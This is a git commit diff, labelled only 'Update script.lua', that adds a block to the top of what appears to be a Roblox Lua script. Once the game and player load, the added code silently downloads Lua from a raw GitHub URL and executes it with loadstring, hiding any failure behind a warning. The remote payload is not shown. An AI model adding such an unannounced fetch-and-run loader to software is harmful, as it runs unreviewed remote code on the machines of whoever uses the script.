4cb9f48f75bb459f24127a1fc80810b1b64df251
Lol hub <alunomarcio.gr178@gmail.com>
2026-02-09 14:15:52 -0300

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,3 +1,19 @@
+task.spawn(function()
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local LP = Players.LocalPlayer
+
+    repeat task.wait() until game:IsLoaded()
+    repeat task.wait() until LP and LP.Character
+
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/AnhDangNhoEm/TuanAnhIOS/refs/heads/main/koby"))()
+    end)
+
+    if not success then
+        warn("Falha ao executar auto-load:", err)
+    end
+end)
 do
   ply = game.Players
   plr = ply.LocalPlayer
